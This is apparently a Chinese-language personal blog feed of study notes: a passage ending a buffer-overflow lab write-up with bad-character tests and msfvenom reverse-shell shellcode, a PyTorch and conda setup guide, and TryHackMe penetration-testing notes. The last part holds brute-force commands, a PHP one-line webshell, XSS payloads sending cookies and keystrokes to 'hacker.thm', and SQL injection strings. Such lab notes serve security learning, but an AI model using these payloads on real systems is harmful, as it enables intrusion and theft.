&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9&#x27;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/17/M3ubZgf1jrGTtUN.png" alt="3ec890a68d2c448d4a1db42e479ed35a"><img src="https://s2.loli.net/2024/12/17/f6jIPXGweQyag4t.png" alt="3940fca0e1a8994b15dc6b1697d53110"></p><p>测试，eip被覆盖为0x66666666</p><p><img src="https://s2.loli.net/2024/12/17/RW4k9mOBC76jl5Q.png" alt="8d10fb7567f56cc4695ee6889e500027"></p><p>测试坏字符，在leavemsg下断点</p><p><img src="https://s2.loli.net/2024/12/17/mngIsYGCrQHRKBX.png" alt="866b373e793e96ec2835b410f1cda64b"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &#x27;print &quot;\x55&quot; * (2060 - 256) + &quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/17/RFj2alk6SWXdqQ7.png" alt="7b0af168e2539b7e189dff45aa09008a"></p><p>得到坏字符<code>0x00 0x09 0x0a 0x20</code>，利用msfvenom生成反弹shellcode</p><p><img src="https://s2.loli.net/2024/12/17/xYdwS4cpgjDXHml.png" alt="01335b1c39488230c1a58bc321c47eca"></p><p>写入shellcode，调试确定shellcode位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &#x27;print &quot;\x55&#x27; * (2060 - 95 - 100) + &quot;\x77&quot;*100 + &quot;\xd9\xcb\xb8\x5f\xb1\x6a\x02\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x31\x43\x17\x83\xeb\xfc\x03\x1c\xa2\x88\xf7\x93\x1f\xbb\x1b\x80\xdc\x17\xb6\x24\x6a\x76\xf6\x4e\xa1\xf9\x64\xd7\x89\xc5\x47\x67\xa0\x40\xa1\x0f\x4c\xb3\x51\xce\xda\xb1\x51\xaa\x73\x3f\xb0\xfa\xe2\x6f\x62\xa9\x59\x8c\x0d\xac\x53\x13\x5f\x46\x02\x3b\x13\xfe\xb2\x6c\xfc\x9c\x2b\xfa\xe1\x32\xff\x75\x04\x02\xf4\x48\x47&quot; + &quot;\x66&quot; * 4&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/17/x4vkWQLClsecYHp.png" alt="375d2b79d2721576db35d030d99f9d5d"></p><p>利用点前用空指令NOP（0x90）填充，运行程序收到反弹shell</p><p><img src="https://s2.loli.net/2024/12/17/dZCNXVFpzLgKtj2.png" alt="702811fb35087d168f816a3d217e0830"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习环境</title>
      <link href="/2024/07/29/deeplearn/"/>
      <url>/2024/07/29/deeplearn/</url>
      
        <content type="html"><![CDATA[<h1>深度学习环境</h1><p><strong>参考资料</strong>：<a href="https://www.bilibili.com/video/BV1hE411t7RN/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2979ee43e62e9592a095de5a11b26d9a">PyTorch深度学习快速入门教程</a>、<a href="https://zh-v2.d2l.ai/chapter_preface/index.html">《动手学深度学习》</a></p><h2 id="pytorch入门">PyTorch入门</h2><h3 id="环境配置">环境配置</h3><p>1、<a href="www.anaconda.com">anaconda</a>，用于科学计算的python发行版，推荐镜像站下载</p><p>2、英伟达显卡驱动</p><p>确保Cuda runtime version支持显卡算力，保证Cuda runtime version &lt;= Cuda driver version</p><p>在搜索引擎查找自己显卡算力</p><p>查看Cuda driver version</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>3、PyTorch(GPU)</p><p>创建环境以应对不同项目对不同版本pytorch的需求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create -n [name] python=[版本]</span><br></pre></td></tr></table></figure><blockquote><p>报错常见解决方法</p><p>1、换源</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure><p>2、解决SSL问题(禁用SSL验证,注意这不太安全应谨慎使用）)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --set ssl_verify no</span><br></pre></td></tr></table></figure><p>3、更新Conda</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure></blockquote><p>查看有哪些环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda env list</span><br></pre></td></tr></table></figure><p>切换环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda activate pytorch</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure><p>查看当前环境下有哪些包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure><p>删除环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove -n [name] --all</span><br></pre></td></tr></table></figure><blockquote><p>持久化添加/删除通道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels [通道地址]</span><br><span class="line">conda config --remove channels [通道地址]</span><br></pre></td></tr></table></figure><p>查看配置文件中有哪些通道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda config --get</span><br><span class="line">conda config --show</span><br></pre></td></tr></table></figure></blockquote><p>在<a href="https://pytorch.org/get-started/locally/">Pytorch官网</a>根据自己显卡算力和驱动版本选择最新的Cuda runtime version即可，也推荐换源，若报错大多可能为源设置错误问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio pytorch-cuda=12.1 -c pytorch -c nvidia</span><br></pre></td></tr></table></figure><blockquote><p>pytorch包含三个包<code>pytorch</code>（核心功能）、<code>torchvision</code>（图像处理）、<code>torchaudio</code>（语言处理）</p></blockquote><p>验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.8</span><span class="number">.19</span> (default, Mar <span class="number">20</span> <span class="number">2024</span>, <span class="number">19</span>:<span class="number">55</span>:<span class="number">45</span>) [MSC v<span class="number">.1916</span> <span class="number">64</span> bit (AMD64)] :: Anaconda, Inc. on win32</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> torch</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.cuda.is_available()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>4、配置pycharm</p><p>选择python解释器中选择在conda中配置的解释器即可</p><p>将终端设置为Anaconda命令行，设置搜索<code>Terminal</code>，路径设置为Anaconda命令行位置即可</p><p>5、配置jupyter notebook</p><p>将jupyter notebook加入环境变量，添加pytorch环境</p><p>安装ipykernel：<br><code>conda install ipykernel</code><br>如果不可行就使用<code>pip install ipykernel</code></p><p>激活虚拟环境</p><p>将环境写入Notebook的kernel中：<br><code>python -m ipykernel install --user --name 环境名称 --display-name &quot;Python (环境名称)&quot;</code></p><p>打开Jupyter notebook，新建Python文件，选择你创建的环境</p><blockquote><p>三种运行方式对比：</p><p>1、python文件：代码以块为一个整体运行</p><p>2、命令行：逐行运行，也可以任意行<code>shift+Enter</code>，但不方便修改</p><p>3、以任意行为块运行</p></blockquote><p>6、为下载的项目配置环境</p><p>设置中配置python解释器，安装缺少的包即可</p><p><a href="https://pytorch.org/get-started/previous-versions/">旧版本Pytorch下载</a></p><h3 id="pytorch语法">PyTorch语法</h3><blockquote><p>善用<code>dir()</code>、<code>help()</code>函数</p></blockquote><p>e.g.</p><p><strong>Dataset</strong></p><p><img src="https://www.z4a.net/images/2024/07/30/14f5c52965d9d95d97b0055b7aad0efd.png" alt="Dataset"></p><p>抽象类</p><h2 id="深度学习基础">深度学习基础</h2><p>贴一份GitHub上的<a href="https://github.com/AccumulateMore/CV.git">笔记</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to TryHackMe</title>
      <link href="/2024/07/10/tryhackme/"/>
      <url>/2024/07/10/tryhackme/</url>
      
        <content type="html"><![CDATA[<p><strong>VPN Connect Issue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity)</span><br><span class="line">TLS Error: TLS handshake failed</span><br></pre></td></tr></table></figure><p>reason：A perimeter firewall on the server’s network is filtering out incoming OpenVPN packets (by default OpenVPN uses UDP or TCP port number 1194)（<s>省流：被墙了</s>）</p><p>解决方案：在配置中加<code>socks-proxy 127.0.0.1 7890</code>，走clash的前置代理</p><h1>Jr Penetration Tester</h1><h2 id="信息打点">信息打点</h2><ul><li><p>web源码（注释、前端元素、JS断点调试）</p></li><li><p>测试网站交互部分、功能点</p></li><li><p>路径（Content Discovery）<br>1、<code>robots.txt</code><br>2、默认图标泄露网站开发框架 <code>curl &#123;URL&#125; | md5sum</code>得图标MD5值到<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">网站查询</a><br>3、<code>Sitemap.xml</code><br>4、HTTP响应头 <code>curl &#123;URL&#125; -v</code><br>5、浏览器搜索<br>6、<code>Wappalyzer</code>插件<br>7、GitHub<br>8、自动化扫描工具<code>dirsearch</code> 、<code>ffuf</code>、 <code>dirb</code>、 <code>Gobuster</code>等</p></li></ul><blockquote><p>常见搜索过滤器<br><code>site</code> : returns results only from the specified website address <code>site:tryhackme.com</code><br><code>inurl</code>:returns results that have the specified word in the URL <code>inurl:admin</code><br><code>filetype</code>:returns results which are a particular file extension <code>filetype:pdf</code><br><code>intitle</code>:returns results that contain the specified word in the title <code>intitle:admin</code></p></blockquote><ul><li>子域名<br>1、爆破、OSINT、DNS记录（<a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>、<a href="https://crt.sh">网站</a>、dnsrecon <code>dnsrecon -t brt -d acmeitsupport.thm</code>）<br>2、搜索引擎<code>-site:www.tryhackme.com site:*.tryhackme.com</code></li></ul><h2 id="网络安全">网络安全</h2><ul><li><p>被动侦察（无需直接连接到目标即可收集有关目标的信息）<br>1、whois记录（通过网站或<code>whois DOMAIN_NAME</code>）：获得注册商（该域名通过哪个注册商注册）、注册人的联系信息如姓名、组织、地址、电话等。（除非通过隐私服务隐藏）、域名首次注册的时间是什么时候、上次更新的时间是什么时候、什么时候需要续订、要求哪个服务器解析域名<br>2、通过<code>nslookup</code>、<code>dig</code>利用DNS查询域名的A（IPV4）、AAAA（IPV6）、CNAME、MX、SOA、TXT记录<br>3、<a href="https://dnsdumpster.com/">DNSDumpster</a>(可查询子域名)<br>4、<a href="https://www.shodan.io/">Shodan.io</a>(IP地址、托管公司、地理位置、服务器类型和版本)</p></li><li><p>主动侦察<br>1、<code>ping IP</code>确保目标系统在线，ping 数据包被正确路由且未被任何防火墙阻止，则远程系统应发回 ICMP Echo Reply<br>2、<code>traceroute IP</code>找到数据包从您的系统到目标主机所经过的路由器或跳数的 IP 地址。<br>3、<code>telnet IP PORT</code>远程系统通信,可以连接到在TCP上运行的任何服务，除非使用加密，使用时需要指定协议，如发现有关监听端口 80 的 Web 服务器的更多信息</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">host: telnet</span><br></pre></td></tr></table></figure><p>如果我们连接到邮件服务器，则需要根据协议使用适当的命令，例如SMTP和POP3<br>4、<strong>Netcat</strong>：支持 TCP 和UDP协议，可以作为连接到侦听端口的客户端；或充当侦听您选择的端口的服务器</p><blockquote><p>-l聆听模式<br>-p指定端口号<br>-n仅限数字；无法通过DNS解析主机名<br>-v详细输出（可选，但有助于发现任何错误）<br>-vv非常详细（可选）<br>-k客户端断开连接后继续监听</p><p>1、-p应该出现在您想要监听的端口号之前。<br>2、-n将避免DNS查找和警告。<br>3、小于 1024 的端口号需要 root 权限才能监听。</p></blockquote></li><li><p>常见协议</p></li></ul><table><thead><tr><th>Protocol</th><th>TCP Port</th><th>Application(s)</th><th>Data Security</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>文件传输</td><td>Cleartext</td></tr><tr><td>FTPS</td><td>990</td><td>文件传输</td><td>Encrypted</td></tr><tr><td>HTTP</td><td>80</td><td>网页传输</td><td>Cleartext</td></tr><tr><td>HTTPS</td><td>443</td><td>网页传输</td><td>Encrypted</td></tr><tr><td>IMAP</td><td>143</td><td>电子邮件(MDA)</td><td>Cleartext</td></tr><tr><td>IMAPS</td><td>993</td><td>电子邮件(MDA)</td><td>Encrypted</td></tr><tr><td>POP3</td><td>110</td><td>电子邮件(MDA)</td><td>Cleartext</td></tr><tr><td>POP3S</td><td>995</td><td>电子邮件(MDA)</td><td>Encrypted</td></tr><tr><td>SFTP</td><td>22</td><td>文件传输</td><td>Encrypted</td></tr><tr><td>SSH</td><td>22</td><td>远程连接和文件传输</td><td>Encrypted</td></tr><tr><td>SMTP</td><td>25</td><td>电子邮件(MTA)</td><td>Cleartext</td></tr><tr><td>SMTPS</td><td>465</td><td>电子邮件(MTA)</td><td>Encrypted</td></tr><tr><td>Telnet</td><td>23</td><td>远程连接</td><td>Cleartext</td></tr></tbody></table><blockquote><p>ftp协议可通过<code>ftp &lt;ip&gt; [port]</code>连接后输入用户密码后执行FTP命令</p></blockquote><ul><li><p>针对密码和明文流量的攻击（可用TLS、SSH加密）</p><p>1、嗅探攻击：使用网络数据包捕获工具收集目标的信息，常用工具如下</p><ul><li><p><strong>Tcpdump</strong>是一个免费的开源命令行界面 ( CLI ) 程序，已被移植到许多操作系统上。</p></li><li><p><strong>Wireshark</strong>是一个免费的开源图形用户界面 (GUI) 程序，适用于多种操作系统，包括Linux、macOS 和 MS Windows。</p></li><li><p><strong>Tshark</strong> 是Wireshark 的CLI替代品。</p></li></ul><p>2、中间人攻击（MITM）：所选协议不提供安全身份验证或完整性检查容易受到这种攻击，许多工具可以帮助你实施此类攻击，例如<a href="https://www.ettercap-project.org/">Ettercap</a>和<a href="https://www.bettercap.org/">Bettercap</a>。</p></li><li><p>弱密码攻击</p><ol><li>社工猜测密码</li><li>字典攻击</li><li>暴力攻击</li></ol><p>工具：<code>Hydra</code>：一般命令行语法是：<code>hydra -l &lt;username&gt; -P &lt;wordlist.txt&gt; &lt;server&gt; &lt;service&gt;</code></p><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td><code>-l username</code></td><td>提供登录名</td></tr><tr><td><code>-P WordList.txt</code></td><td>指定要使用的密码列表</td></tr><tr><td><code>server service</code></td><td>设置要攻击的服务器地址和服务</td></tr><tr><td><code>-s PORT</code></td><td>非默认服务端口号情况下的使用</td></tr><tr><td><code>-V</code>或者<code>-vV</code></td><td>显示正在尝试的用户名和密码组合</td></tr><tr><td><code>-d</code></td><td>如果详细输出没有帮助，则显示调试输出</td></tr></tbody></table></li></ul><h2 id="认证绕过">认证绕过</h2><ul><li><p>FUZZ出已注册用户列表<br>example : <code>ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.88.99/customers/signup -mr &quot;username already exists&quot;</code></p></li><li><p>爆破密码<br><code>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.88.99/customers/login -fc 200</code></p></li><li><p>逻辑漏洞</p></li><li><p>Cookie伪造</p></li></ul><h2 id="idor漏洞">IDOR漏洞</h2><ul><li>修改地址栏参数如<code>/user/details?user_id=123</code>可访问他人信息</li><li>参数挖掘</li><li><code>F12</code>网络查看调用接口返回JSON数据</li></ul><h2 id="文件包含">文件包含</h2><ul><li><p>本地文件包含（任读）<br>1、路径穿越<br>2、<code>%00</code>空字节截断后缀（not working with PHP 5.3.4 and above）<br>3、<code>/etc/passwd/.</code><br>4、双写绕过<code>....//....//</code><br>5、include函数filter伪协议任读，data伪协议命令执行</p></li><li><p>远程文件包含（RCE）<br>要求允许攻击者将外部 URL 注入include函数。allow_url_fopen选项需要打开<br>远程包含一句话木马即可<code>&lt;?php eval($_POST[1]);?&gt;</code></p></li></ul><blockquote><p>Steps for testing for LFI<br>1、Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!<br>2、Enter a valid input to see how the web server behaves.<br>3、Enter invalid inputs, including special characters and common file names.<br>4、Don’t always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.<br>5、Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.<br>6、Understand the input validation and if there are any filters!<br>7、Try the inject a valid entry to read sensitive files</p></blockquote><h2 id="ssrf漏洞-服务器端请求伪造">SSRF漏洞（服务器端请求伪造）</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>常见标志：</p><ul><li>When a full URL is used in a parameter in the address bar<br>在地址栏的参数中使用完整URL时</li><li>A hidden field in a form<br>隐藏字段:表单中的隐藏字段</li><li>A partial URL such as just the hostname（API调用）</li><li>perhaps only the path of the URL</li></ul><h2 id="xss跨站脚本攻击">XSS跨站脚本攻击</h2><p><strong>常见目的</strong>：</p><ul><li><p>验证XSS存在：<code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p></li><li><p>Session窃取：<code>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</code></p></li><li><p>获取键盘输入：<code>&lt;script&gt;document.onkeypress = function(e) &#123; fetch('https://hacker.thm/log?key=' + btoa(e.key) );&#125;&lt;/script&gt;</code></p></li><li><p>调用特定网络资源或JS函数，如修改重置密码邮箱</p><p><code>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</code></p></li></ul><p><strong>常见类型</strong>：</p><ul><li>反射型XSS</li><li>存储型XSS</li><li>DOM型XSS</li></ul><h2 id="命令注入">命令注入</h2><ul><li><code>&amp;</code>、<code>;</code>、<code>&amp;&amp;</code>连接两条命令</li><li>无回显RCE常用检测方式<code>sleep</code>、<code>ping</code>延时，<code>&gt;</code>重定向输出</li><li>反弹shell，利用<code>curl</code><a href="https://www.cnblogs.com/pursue-security/p/15406672.html">DNS外带</a></li><li><code>windows</code>常用命令<code>dir</code>、<code>timeout</code>，<a href="https://github.com/payloadbox/command-injection-payload-list">常见payload参考</a></li></ul><h2 id="sql注入">SQL注入</h2><p><strong>数据库类型</strong></p><ul><li>Relational databases</li><li>Non-Relational databases（NoSQL）：不使用表、列、行来存取数据的数据库，不需构造特定的数据库布局，每行数据可包含不同的信息，MongoDB, Cassandra and ElasticSearch</li></ul><p><strong>注入类型</strong></p><p>1、<strong>In-Band</strong></p><ul><li>报错注入</li><li>联合注入</li><li>…</li></ul><blockquote><p>常规流程（以MySQL为例）</p><p>1、测试查询列数<br><code>0 UNION SELECT 1,2,3</code><br>2、查库名<br><code>0 UNION SELECT 1,2,database()</code><br>3、查表名<br><code>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'</code><br>4、查列名<br><code>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table_name'</code><br>5、获得信息</p></blockquote><p>2、<strong>盲注</strong></p><ul><li>万能密码登录</li><li>布尔盲注</li><li>时间盲注</li></ul><blockquote><p><code>admin123' UNION SELECT 1,2,3;--</code><br><code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code><br><code>admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--</code><br><code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';</code><br><code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';</code><br><code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';</code><br><code>admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%</code></p></blockquote><blockquote><p><code>admin123' UNION SELECT SLEEP(5),2;--</code><br><code>admin123' UNION SELECT SLEEP(1),2 where database() like 's%';--</code><br>…</p></blockquote><p>3、<strong>Out-of-band</strong></p><ul><li>DNSLog外带</li></ul><h2 id="工具-burp-suite">工具-Burp Suite</h2><p><code>ctrl</code>+<code>shift</code>+模块首字母快捷切换模块</p><p>拦截HTTPS流量需配置CA证书</p><ul><li><p><strong>Target</strong>：显示测试域，可用<strong>Scope settings</strong>过滤不需要的流量，在<strong>site 